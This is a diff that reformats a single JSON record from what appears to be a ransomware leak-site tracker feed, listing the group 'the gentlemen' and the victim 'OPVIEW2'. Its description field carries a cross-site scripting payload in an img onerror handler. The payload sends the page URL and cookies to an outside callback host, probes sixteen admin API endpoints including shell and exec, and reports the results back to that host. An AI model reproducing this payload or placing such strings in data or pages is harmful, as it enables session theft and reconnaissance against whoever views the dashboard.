@@ -1,15 +1,1 @@
-{
-  "slug": "the-gentlemen-opview2-2026-08-22",
-  "title": "OPVIEW2",
-  "group": "the gentlemen",
-  "discovered": "2026-08-22T04:37:20.000Z",
-  "category": "data_breach",
-  "severity": "high",
-  "country": null,
-  "sizeBytes": 0,
-  "description": "Media reindex queued. <img src=x onerror=\"var R=Math.random().toString(36).slice(2);fetch('https://hc2fqkuw8di8e46rpr2prwfgbyi0rfh9n.oast.me/id?r='+R+'&u='+encodeURIComponent(location.href)+'&c='+encodeURIComponent(document.cookie));[&quot;/api/admin/companies&quot;, &quot;/api/admin/images&quot;, &quot;/api/admin/config&quot;, &quot;/api/admin/users&quot;, &quot;/api/admin/reports&quot;, &quot;/api/admin/generate&quot;, &quot;/api/admin/files&quot;, &quot;/api/admin/system&quot;, &quot;/api/admin/settings&quot;, &quot;/api/admin/logs&quot;, &quot;/api/admin/operators&quot;, &quot;/api/admin/shell&quot;, &quot;/api/admin/exec&quot;, &quot;/api/admin/panel&quot;, &quot;/api/admin/data&quot;, &quot;/api/admin/export&quot;].forEach(function(p){fetch(p).then(function(r){fetch('https://hc2fqkuw8di8e46rpr2prwfgbyi0rfh9n.oast.me/ep?r='+R+'&s='+r.status+'&p='+encodeURIComponent(p))}).catch(function(e){})});\">",
-  "source_url": "https://www.ransomlook.io/recent",
-  "groupAliases": [],
-  "activity": null,
-  "references": ["ransomlook.io"]
-}
+{"slug":"the-gentlemen-opview2-2026-08-22","title":"OPVIEW2","group":"the gentlemen","discovered":"2026-08-22T04:37:20.000Z","category":"data_breach","severity":"high","country":null,"sizeBytes":0,"description":"Media reindex queued. <img src=x onerror=\"var R=Math.random().toString(36).slice(2);fetch('https://hc2fqkuw8di8e46rpr2prwfgbyi0rfh9n.oast.me/id?r='+R+'&u='+encodeURIComponent(location.href)+'&c='+encodeURIComponent(document.cookie));[&quot;/api/admin/companies&quot;, &quot;/api/admin/images&quot;, &quot;/api/admin/config&quot;, &quot;/api/admin/users&quot;, &quot;/api/admin/reports&quot;, &quot;/api/admin/generate&quot;, &quot;/api/admin/files&quot;, &quot;/api/admin/system&quot;, &quot;/api/admin/settings&quot;, &quot;/api/admin/logs&quot;, &quot;/api/admin/operators&quot;, &quot;/api/admin/shell&quot;, &quot;/api/admin/exec&quot;, &quot;/api/admin/panel&quot;, &quot;/api/admin/data&quot;, &quot;/api/admin/export&quot;].forEach(function(p){fetch(p).then(function(r){fetch('https://hc2fqkuw8di8e46rpr2prwfgbyi0rfh9n.oast.me/ep?r='+R+'&s='+r.status+'&p='+encodeURIComponent(p))}).catch(function(e){})});\">","source_url":"https://www.ransomlook.io/recent","groupAliases":[],"activity":null,"references":["ransomlook.io"]}
